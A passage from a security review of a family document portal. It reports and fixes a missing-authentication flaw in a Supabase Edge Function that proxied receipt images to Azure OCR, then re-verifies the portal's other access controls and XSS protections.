10, and 11 was still holding live (it was — see 12.2), then focused
specifically on the newly added feature, since that's what changed. One
real finding.

### 12.1 Found and fixed: `scan-receipt` could be called by anyone, no account needed

The function's own comment claimed it was "only ever reachable by a
signed-in portal user," relying on Supabase's platform-level "verify JWT"
check that's on by default for every Edge Function. That check only
confirms the `Authorization` header is *some* validly-signed Supabase
token — and the public anon key (printed openly in this site's own
client-shipped JavaScript, by design, same as the site URL itself) is
itself a valid token of exactly that kind. The client code
(`doc-scan.js`'s `postFileToScanReceiptFunction`) was sending that anon
key as the Authorization token on every call, rather than the actual
signed-in user's own session token.

Net effect: nobody needed an account at all. Anyone who found the site's
public URL could open a browser console and call `scan-receipt` directly
with just the anon key, with no login, and it would happily use up Oscar's
Azure quota (the free tier's 500 pages/month) reading whatever image they
sent it. Confirmed live: called the function with only the anon key, no
session — got back a fully successful `200` with real merchant/date/total
data read from a test image.

This is a resource-exhaustion risk, not a data-leak one — the function
never touches the database or Storage, it only proxies to Azure and
returns what Azure reads back, so nothing about the family's actual
documents or finances was ever exposed this way. But it meant a stranger
could quietly exhaust the month's free Azure quota (or, if a paid tier
were ever turned on, run up a real bill) for no reason at all, with zero
authentication.

**Fixed**: the function now calls `supabase.auth.getUser()` on the token
it's given and rejects anything that doesn't resolve to a real, currently
signed-in user — a `401 "Not signed in."` for a missing token, a garbage
token, or (this is the part that was actually broken) the public anon key
on its own. The client side (`doc-scan.js`, `receipts.js`) now sends the
caller's own real session token instead of the anon key, threading it
through both the single-photo capture flow and the bulk-upload flow;
whenever no real session is on hand yet (sample-preview mode, or a call
that raced ahead of the page's own session check), Azure is skipped
entirely and the free local scan handles it, exactly like the existing
"Azure not configured" fallback already did.

**Re-tested live, end to end, after deploying the fix**: the anon-key-only
request that previously succeeded now gets `401 {"error":"Not signed
in."}`. A disposable test account (created via the Supabase dashboard,
zero `portal_access` grants, deleted immediately after) was used to get a
real session token via the password-grant endpoint — calling `scan-receipt`
with that real token still works exactly as before, returning a correctly
read `200` result. No account was left behind afterwards.

### 12.2 Everything else re-confirmed live, still holding

- `entities`, `portal_access`, and `entity_documents`: still `401`
  permission denied with only the anon key, no session.
- Storage bucket listing and object listing: still empty/denied with no
  session.
- `SECURITY_AND_UX_REVIEW.md`, `SETUP.md`, and `supabase-schema.sql`: still
  `404` on the published site (the `docs/`-only Pages source from 11.1 is
  still in effect).
- Clickjacking guard: still present in the live `receipts.html`.
- Every CDN script tag on `receipts.html` still carries a subresource-
  integrity hash; `doc-scan.js`/`receipts.js` remain same-origin files with
  no external hosting.
- The new Azure integration doesn't introduce a fresh XSS path: OCR-derived
  text from Azure (merchant name, line items - the same kind of externally
  supplied content that caused the bank-statement bug in 11.2) only ever
  reaches the page via `.value =` DOM property assignment (single-receipt
  autofill) or via the database's existing, already-`escapeHtml`/
  `escapeAttr`-protected rendering path (bulk upload) - never via
  string-built `innerHTML`. Checked `doc-scan.js` and `receipts.js`
  specifically for this before ruling it out, not assumed.
- `expiry-digest` (the other Edge Function) was reviewed alongside
  `scan-receipt` - it has no equivalent gap, since it's only ever invoked
  by its own scheduled `pg_cron` job, not by anything reachable from a
  browser with the anon key.

### 12.3 Net result

One real finding, fixed and confirmed live: `scan-receipt` now genuinely
requires a signed-in portal session, not just the public key. Everything
else audited in this pass - the core RLS/Storage/auth boundaries, the
repo's public-file exposure, XSS, and supply-chain pinning - was
re-verified live rather than assumed, and all of it still holds.
